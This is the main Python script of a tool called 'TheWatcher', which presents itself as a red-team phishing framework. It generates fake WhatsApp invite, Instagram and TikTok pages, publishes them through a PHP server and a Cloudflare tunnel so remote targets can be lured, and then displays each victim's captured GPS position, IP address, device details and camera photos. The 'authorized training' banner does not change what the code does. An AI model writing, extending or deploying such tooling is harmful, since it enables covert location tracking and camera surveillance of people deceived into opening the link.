#!/usr/bin/env python3
"""
TheWatcher v2.0 - Professional Red Team Framework
Author: EvilmaxSec
"""

import os
import sys
import time
import json
import subprocess
import threading
import re
import socket

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(f"""{Colors.RED}{Colors.BOLD}
      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
                            ~EvilmaxSec | Tz~
{Colors.END}
{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}{Colors.BOLD}║         TheWatcher - Advanced Phishing Framework             ║{Colors.END}
{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}
{Colors.GRAY}┌────────────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}Author: {Colors.RED}EvilmaxSec(cyber-ninja){Colors.GRAY}                                       │
│  {Colors.WHITE}GitHub: {Colors.GRAY}https://github.com/EvilmaxSec{Colors.GRAY}                                 │
│  {Colors.RED}⚠  AUTHORIZED TRAINING USE ONLY  ⚠{Colors.GRAY}                                    │
└────────────────────────────────────────────────────────────────────────┘{Colors.END}
""")

def print_menu(title, options):
    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─────────────────────────────────────────────────┐{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}│          {title:<37}{Colors.CYAN}{Colors.BOLD}  │{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}├─────────────────────────────────────────────────┤{Colors.END}")
    for key, value in options.items():
        print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.END}  {Colors.RED}[{key}]{Colors.END} {Colors.WHITE}{value:<39}{Colors.CYAN}{Colors.BOLD}   │{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}└─────────────────────────────────────────────────┘{Colors.END}")

def print_success(msg): print(f"  {Colors.GREEN}✓{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_error(msg): print(f"  {Colors.RED}✗{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_info(msg): print(f"  {Colors.BLUE}ℹ{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
def print_warning(msg): print(f"  {Colors.YELLOW}⚠{Colors.END} {Colors.WHITE}{msg}{Colors.END}")

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_input(prompt, default=""):
    if default:
        val = input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}{Colors.GRAY} [{default}]:{Colors.END} ")
        return val if val else default
    return input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}:{Colors.END} ")

def get_number(prompt, min_val, max_val):
    while True:
        try:
            val = get_input(prompt)
            if not val:
                print_error(f"Please enter a number between {min_val} and {max_val}")
                continue
            num = int(val)
            if min_val <= num <= max_val:
                return num
            print_error(f"Enter number between {min_val}-{max_val}")
        except ValueError:
            print_error("Invalid number. Please enter a numeric value")

def get_image_source(prompt_type):
    print(f"\n  {Colors.CYAN}📸 {prompt_type}{Colors.END}")
    print(f"  {Colors.GRAY}[1] Use image URL{Colors.END}")
    print(f"  {Colors.GRAY}[2] Use local image file{Colors.END}")
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter image URL", "https://i.imgur.com/5Q8YqXq.png")
    else:
        while True:
            path = get_input("Enter local image path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            elif os.path.exists(path) and os.path.isdir(path):
                print_error(f"'{path}' is a directory. Please select a valid image file (jpg, png, gif)")
            else:
                print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                print_warning("Using default image URL")
                return "https://i.imgur.com/5Q8YqXq.png"

def get_video_source():
    print(f"\n  {Colors.CYAN}🎬 Video Source{Colors.END}")
    print(f"  {Colors.GRAY}[1] Use video URL{Colors.END}")
    print(f"  {Colors.GRAY}[2] Use local video file{Colors.END}")
    
    choice = get_input("Choose option", "1")
    
    if choice == "1":
        return get_input("Enter video URL", "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4")
    else:
        while True:
            path = get_input("Enter local video path")
            if os.path.exists(path) and os.path.isfile(path):
                return path
            elif os.path.exists(path) and os.path.isdir(path):
                print_error(f"'{path}' is a directory. Please select a valid video file (mp4, webm, mov)")
            else:
                print_error(f"File not found: {path}")
            retry = get_input("Try again? (y/n)", "y")
            if retry.lower() != 'y':
                print_warning("Using default video URL")
                return "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"

def clear_old_data():
    if os.path.exists('data'):
        for file in os.listdir('data'):
            file_path = os.path.join('data', file)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except:
                pass
    else:
        os.makedirs('data', exist_ok=True)

def monitor_data(stop_event):
    processed_files = set()
    while not stop_event.is_set():
        time.sleep(1)
        if os.path.exists('data'):
            current_files = set(os.listdir('data'))
            new_files = current_files - processed_files
            for file in new_files:
                if file.endswith('.json'):
                    filepath = os.path.join('data', file)
                    try:
                        with open(filepath, 'r') as f:
                            data = json.load(f)
                            if 'coordinates' in data and data['coordinates'].get('latitude'):
                                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                                print(f"{Colors.GREEN}{Colors.BOLD}📍 NEW LOCATION CAPTURED!{Colors.END}")
                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                                print(f"  {Colors.YELLOW}📅 Time:{Colors.END} {data.get('timestamp')}")
                                print(f"  {Colors.YELLOW}🌐 IP:{Colors.END} {data.get('ip_address')}")
                                print(f"  {Colors.YELLOW}📍 GPS:{Colors.END} {data['coordinates']['latitude']}, {data['coordinates']['longitude']}")
                                print(f"  {Colors.YELLOW}🎯 Accuracy:{Colors.END} {data['coordinates']['accuracy']}m")
                                print(f"  {Colors.YELLOW}🗺️ Maps:{Colors.END} {data['coordinates']['google_maps_url']}")
                                print(f"  {Colors.YELLOW}📱 Device:{Colors.END} {data['device']['device']}")
                                print(f"  {Colors.YELLOW}💻 OS:{Colors.END} {data['device']['os']}")
                                print(f"  {Colors.YELLOW}🌍 Browser:{Colors.END} {data['device']['browser']}")
                                print(f"  {Colors.YELLOW}🏙️ City:{Colors.END} {data['network']['city']}")
                                print(f"  {Colors.YELLOW}🇺🇸 Country:{Colors.END} {data['network']['country']}")
                                print(f"  {Colors.YELLOW}💾 Saved:{Colors.END} {file}")
                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
                    except:
                        pass
                elif file.endswith('.jpg'):
                    size = os.path.getsize(os.path.join('data', file)) // 1024
                    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                    print(f"{Colors.GREEN}{Colors.BOLD}📸 NEW CAMERA IMAGE CAPTURED!{Colors.END}")
                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
                    print(f"  {Colors.YELLOW}📅 Time:{Colors.END} {time.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"  {Colors.YELLOW}📁 File:{Colors.END} {file}")
                    print(f"  {Colors.YELLOW}📊 Size:{Colors.END} {size} KB")
                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
            processed_files = current_files

class TheWatcher:
    def __init__(self):
        self.monitor_thread = None
        self.php_process = None
        self.stop_monitor = threading.Event()
    
    def run_server(self, port, html):
        clear_old_data()
        
        os.makedirs('templates', exist_ok=True)
        with open('templates/current.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        print_info(f"Starting PHP server on port {port}...")
        
        php_check = subprocess.run(["which", "php"], capture_output=True)
        if php_check.returncode != 0:
            print_error("PHP is not installed. Please install PHP first:")
            print_info("Ubuntu/Debian: sudo apt install php -y")
            print_info("Termux: pkg install php -y")
            sys.exit(1)
        
        self.stop_monitor.clear()
        self.monitor_thread = threading.Thread(target=monitor_data, args=(self.stop_monitor,), daemon=True)
        self.monitor_thread.start()
        
        self.php_process = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}", "server.php"],
            stderr=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        
        def read_stderr():
            for line in iter(self.php_process.stderr.readline, ''):
                if line.strip():
                    if "Accepted" in line or "Closing" in line:
                        continue
                    if "Development Server" in line:
                        continue
                    if "favicon.ico" in line:
                        continue
                    print(line.strip())
        
        stderr_thread = threading.Thread(target=read_stderr, daemon=True)
        stderr_thread.start()
        
        time.sleep(2)
        
        from modules.cloudflare import CloudflareTunnel
        cf = CloudflareTunnel()
        url = cf.start(port)
        
        local_ip = get_local_ip()
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}🌐 SHAREABLE LINKS{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        
        if url:
            print_success(f"Cloudflare URL: {Colors.YELLOW}{url}{Colors.END}")
        else:
            print_warning("Cloudflare tunnel failed to start")
        
        print_success(f"Local URL:     {Colors.YELLOW}http://localhost:{port}{Colors.END}")
        print_success(f"Network URL:   {Colors.YELLOW}http://{local_ip}:{port}{Colors.END}")
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}💡 TIPS{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"  {Colors.WHITE}• Use Cloudflare URL for remote targets{Colors.END}")
        print(f"  {Colors.WHITE}• Use Local URL for testing on same device{Colors.END}")
        print(f"  {Colors.WHITE}• Use Network URL for LAN targets{Colors.END}")
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     🚀 TheWatcher is Active!                         ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     📡 Waiting for targets to visit the link...     ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}║     🔴 Press Ctrl+C to stop                         ║{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════╝{Colors.END}")
        print(f"{Colors.GRAY}{'─' * 60}{Colors.END}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\n🛑 Stopping server...")
            self.stop_monitor.set()
            if self.php_process:
                self.php_process.terminate()
                time.sleep(1)
                self.php_process.kill()
            cf.stop()
            print_success("Server stopped successfully")
    
    def location_menu(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📍 LOCATION TRACKING MODULE{Colors.END}")
        print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
        
        print_menu("SELECT TEMPLATE", {
            "1": "WhatsApp Group Invite",
            "2": "Instagram Story", 
            "3": "TikTok Video"
        })
        
        choice = get_number("Choose template", 1, 3)
        
        from modules.templates import TemplateManager
        
        if choice == 1:
            print(f"\n{Colors.CYAN}{Colors.BOLD}📝 CUSTOMIZE WHATSAPP GROUP INVITE{Colors.END}")
            print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
            
            name = get_input("Group name", "Security Group")
            image = get_image_source("Group Image")
            members = get_input("Number of members", "128")
            
            try:
                members = int(members) if members else 128
            except ValueError:
                members = 128
            
            print_info("Generating WhatsApp Group Invite template...")
            html = TemplateManager.get_whatsapp_location(name, image, str(members))
            port = get_number("Port (default 8080)", 1, 65535)
            self.run_server(port if port != 8080 else 8080, html)
        
        elif choice == 2:
            print(f"\n{Colors.CYAN}{Colors.BOLD}📝 CUSTOMIZE INSTAGRAM STORY{Colors.END}")
            print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
            
            username = get_input("Username", "instagram")
            verified = get_input("Verified badge? (y/n)", "n").lower() == 'y'
            profile_image = get_image_source("Profile Image")
            video_path = get_video_source()
            views = get_input("Number of views", "1.2M")
            likes = get_input("Number of likes", "125K")
            caption = get_input("Story caption", "Check out my story! ✨")
            
            print_info("Generating Instagram Story template...")
            html = TemplateManager.get_instagram_story_custom(username, verified, profile_image, video_path, views, likes, caption)
            port = get_number("Port (default 8080)", 1, 65535)
            self.run_server(port if port != 8080 else 8080, html)
        
        elif choice == 3:
            print(f"\n{Colors.CYAN}{Colors.BOLD}📝 CUSTOMIZE TIKTOK VIDEO{Colors.END}")
            print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
            
            username = get_input("Username", "tiktok")
            verified = get_input("Verified badge? (y/n)", "n").lower() == 'y'
            profile_image = get_image_source("Profile Image")
            video_path = get_video_source()
            views = get_input("Number of views", "1.2M")
            likes = get_input("Number of likes", "125K")
            comments = get_input("Number of comments", "12.5K")
            shares = get_input("Number of shares", "5.2K")
            caption = get_input("Video caption", "Check out this amazing video! 🔥")
            
            print_info("Generating TikTok Video template...")
            html = TemplateManager.get_tiktok_video_custom(username, verified, profile_image, video_path, views, likes, comments, shares, caption)
            port = get_number("Port (default 8080)", 1, 65535)
            self.run_server(port if port != 8080 else 8080, html)
    
    def camera_menu(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📸 CAMERA ACCESS MODULE{Colors.END}")
        print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
        
        print_menu("SELECT TEMPLATE", {
            "1": "Instagram Reel",
            "2": "TikTok Video"
        })
        
        template = get_number("Choose template", 1, 2)
        
        from modules.templates import TemplateManager
        
        if template == 1:
            print(f"\n{Colors.CYAN}{Colors.BOLD}📝 CUSTOMIZE INSTAGRAM REEL{Colors.END}")
            print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
            
            username = get_input("Username", "instagram")
            verified = get_input("Verified badge? (y/n)", "n").lower() == 'y'
            profile_image = get_image_source("Profile Image")
            video_path = get_video_source()
            likes = get_input("Number of likes", "1.2M")
            comments = get_input("Number of comments", "12.5K")
            shares = get_input("Number of shares", "5.2K")
            caption = get_input("Video caption", "Amazing content! Check out this reel 🔥")
            
            print_info("Generating Instagram Reel template...")
            html = TemplateManager.get_instagram_camera(username, verified, profile_image, video_path, likes, comments, shares, caption)
            port = get_number("Port (default 8080)", 1, 65535)
            self.run_server(port if port != 8080 else 8080, html)
        
        elif template == 2:
            print(f"\n{Colors.CYAN}{Colors.BOLD}📝 CUSTOMIZE TIKTOK VIDEO{Colors.END}")
            print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
            
            username = get_input("Username", "tiktok")
            verified = get_input("Verified badge? (y/n)", "n").lower() == 'y'
            profile_image = get_image_source("Profile Image")
            video_path = get_video_source()
            likes = get_input("Number of likes", "1.2M")
            comments = get_input("Number of comments", "12.5K")
            shares = get_input("Number of shares", "5.2K")
            caption = get_input("Video caption", "Check out this amazing video! 🔥")
            
            print_info("Generating TikTok video template...")
            html = TemplateManager.get_tiktok_camera(username, verified, profile_image, video_path, likes, comments, shares, caption)
            port = get_number("Port (default 8080)", 1, 65535)
            self.run_server(port if port != 8080 else 8080, html)
    
    def view_data(self):
        print(f"\n{Colors.BLUE}{Colors.BOLD}📊 COLLECTED DATA{Colors.END}")
        print(f"{Colors.GRAY}{'─' * 50}{Colors.END}")
        
        if not os.path.exists('data') or not os.listdir('data'):
            print_warning("No data collected yet")
            input(f"\n  {Colors.GRAY}Press Enter to continue...{Colors.END}")
            return
        
        files = [f for f in os.listdir('data') if f.endswith('.json')]
        images = [f for f in os.listdir('data') if f.endswith('.jpg')]
        
        if files:
            print_info(f"Location Data: {len(files)} files")
            for f in files:
                try:
                    with open(f'data/{f}', 'r') as file:
                        data = json.load(file)
                        print(f"\n  {Colors.GREEN}📄 {f}{Colors.END}")
                        print(f"     {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
                        print(f"     {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
                        if 'coordinates' in data and data['coordinates'].get('latitude'):
                            print(f"     {Colors.YELLOW}GPS:{Colors.END} {data['coordinates'].get('latitude')}, {data['coordinates'].get('longitude')}")
                            print(f"     {Colors.YELLOW}Maps:{Colors.END} {data['coordinates'].get('google_maps_url')}")
                        if 'device' in data:
                            print(f"     {Colors.YELLOW}Device:{Colors.END} {data['device'].get('device')} | OS: {data['device'].get('os')}")
                        if 'network' in data:
                            print(f"     {Colors.YELLOW}Location:{Colors.END} {data['network'].get('city')}, {data['network'].get('country')}")
                except Exception as e:
                    print(f"  {f}")
        
        if images:
            print_info(f"\nCamera Images: {len(images)} files")
            for img in images:
                size = os.path.getsize(f'data/{img}') // 1024
                print(f"     {Colors.YELLOW}📸{Colors.END} {img} ({size}KB)")
        
        input(f"\n  {Colors.GRAY}Press Enter to continue...{Colors.END}")
    
    def main(self):
        while True:
            banner()
            print_menu("MAIN MENU", {
                "1": "📍 Geotrack Target location",
                "2": "📸 Capture Target Camera",
                "3": "📊 View Data",
                "4": "🚪 Exit"
            })
            
            choice = get_input("\nSelect", "1")
            
            if choice == '1':
                self.location_menu()
            elif choice == '2':
                self.camera_menu()
            elif choice == '3':
                self.view_data()
            elif choice == '4':
                print_success("Happy Hacking!")
                sys.exit(0)
            else:
                print_error("Invalid option")
                time.sleep(1)

if __name__ == "__main__":
    watcher = TheWatcher()
    watcher.main()
